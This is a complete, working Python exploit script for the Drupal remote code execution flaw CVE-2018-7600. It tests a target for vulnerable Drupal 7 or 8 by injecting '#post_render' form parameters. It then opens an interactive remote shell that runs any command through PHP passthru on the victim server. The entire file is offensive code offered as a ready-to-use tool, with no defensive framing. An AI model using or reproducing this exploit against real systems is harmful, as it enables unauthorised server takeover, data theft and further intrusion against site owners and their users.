#!/usr/bin/python2
# -*- coding: utf8 -*-

import sys
import urllib
import urllib2

print '\n############################################################'
print '#                                                          #'
print '#   Drupal Remote Shell using CVE-2018-7600                #'
print '#   Use : DRS.py HostPath                                  #'
print '#   https://github.com/antonio-fr/DrupalRS                 #'
print '#                                                          #'
print '############################################################\n'

if len(sys.argv)!=2:
	print "Use : DRS.py http[s]://hostname|IP"
	sys.exit()
target = sys.argv[1]

def post_data(path, data_dict):
	req = urllib2.Request(path)
	req.add_header('Content-type', 'multipart/form-data')
	r = urllib2.urlopen(path, urllib.urlencode(data_dict), 5)
	content = r.read()
	return content

def send_cmd_v7(site, php_fct, args):
	url = site + '/user/password?name[%23post_render][0]=' + php_fct \
		+ '&name[%23markup]=' + urllib.quote(args)
	payload = { 'form_id' : 'user_pass', '_triggering_element_name' : 'name' }
	rsp1 = post_data(url, payload)
	clist = rsp1.split('"')
	formb_id =  clist[ clist.index("form_build_id") + 2 ]
	url2 = site + '/file/ajax/name/%23value/' + formb_id
	payload2 = { 'form_build_id' : formb_id }
	rsp2 = post_data(url2, payload2)
	if rsp2[-1] != "]":
		return "Failure"
	return rsp2

def send_cmd_v8(site, php_fct, args):
	url = site + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
	payload = { 'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[a][#post_render][]': php_fct,
		'mail[a][#type]': 'markup', 'mail[a][#markup]': args }
	rsp = post_data(url, payload)
	if rsp[-1] != "]":
		return "Failure"
	return rsp

def get_output(full_response):
	end_resp = full_response.find('[{"command":') - 1
	if end_resp > 0:
		return full_response[:end_resp]
	else:
		return ""

def rem_shell(domain, version, cmd):
	if version == 7:
		rsp = send_cmd_v7(domain, 'passthru', cmd)
	if version == 8:
		rsp = send_cmd_v8(domain, 'passthru', cmd)
	return get_output(rsp)

def testvuln(site):
	try:
		if get_output(send_cmd_v7(site, 'printf', 'ABCZ\n')) == 'ABCZ':
			print "This server hosts a vulnerable Drupal v7"
			return 7
	except:
		pass
	try:
		if get_output(send_cmd_v8(site, 'printf', 'ABCZ\n')) == 'ABCZ':
			print "This server hosts a vulnerable Drupal v8"
			return 8
	except:
		pass
	return 0

version = testvuln(target)
if version != 8 and version != 7:
	print "This server doesn't host a vulnerable Drupal"
	sys.exit()
dmn = target.split("://")[1]
print "Connected to",dmn
print "# CTRL+D RETURN to quit\n"
while True:
	cmd = raw_input("[drupal@"+dmn+" ~]#")
	if cmd == "\x04":
		break
	print rem_shell(target, version, cmd)
print "logout"

